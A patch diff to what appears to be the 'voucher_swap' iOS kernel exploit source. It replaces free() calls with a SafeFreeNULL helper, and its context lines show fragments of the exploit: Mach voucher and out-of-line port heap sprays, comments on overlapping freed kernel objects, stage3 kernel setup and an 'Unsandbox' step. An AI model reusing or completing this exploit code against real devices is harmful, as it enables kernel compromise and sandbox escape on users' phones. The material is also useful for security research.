@@ -18,6 +18,7 @@
 #include "mach_vm.h"
 #include "parameters.h"
 #include "platform.h"
+#include "common.h"
 
 
 // ---- Global parameters -------------------------------------------------------------------------
@@ -194,7 +195,7 @@ voucher_spray_free(mach_port_t *voucher_ports, size_t count) {
 			mach_port_deallocate(mach_task_self(), voucher_ports[i]);
 		}
 	}
-	free(voucher_ports);
+	SafeFreeNULL(voucher_ports);
 }
 
 // ---- Helpers -----------------------------------------------------------------------------------
@@ -665,7 +666,7 @@ stage3_init(uint64_t ipc_space_kernel, uint64_t kernel_map) {
 	fake_port = MACH_PORT_NULL;
 	success = true;
 fail_1:
-	free(data);
+	SafeFreeNULL(data);
 fail_0:
 	return success;
 }
@@ -890,7 +891,7 @@ voucher_swap() {
 			ool_ports_spray_size);
 	INFO("sprayed %zu bytes of OOL ports to %zu ports in kalloc.%zu",
 			sprayed_size, ool_holding_port_count, ool_port_spray_kalloc_zone);
-	free(ool_ports);
+	SafeFreeNULL(ool_ports);
 
 	// 12. Once we've reallocated the voucher with an OOL ports allocation, the iv_refs field
 	// will overlap with the lower 32 bits of the pointer to base_port. If base_port's address
@@ -1000,9 +1001,9 @@ voucher_swap() {
 	// ports, and close the sprayed pipes.
 	thread_terminate(thread);
 	destroy_ports(filler_ports, filler_port_count);
-	free(filler_ports);
+	SafeFreeNULL(filler_ports);
 	close_pipes(pipefds_array, pipe_count);
-	free(pipefds_array);
+	SafeFreeNULL(pipefds_array);
 
 	// 17. Use mach_port_request_notification() to put a pointer to an array containing
 	// base_port in our port's ip_requests field.
@@ -1138,7 +1139,7 @@ voucher_swap() {
 
 	// 29. And finally, deallocate the remaining unneeded (but non-corrupted) resources.
 	pipe_close(pipefds);
-	free(pipe_buffer);
+	SafeFreeNULL(pipe_buffer);
 	mach_port_destroy(mach_task_self(), base_port);
     
     // 30. Unsandbox
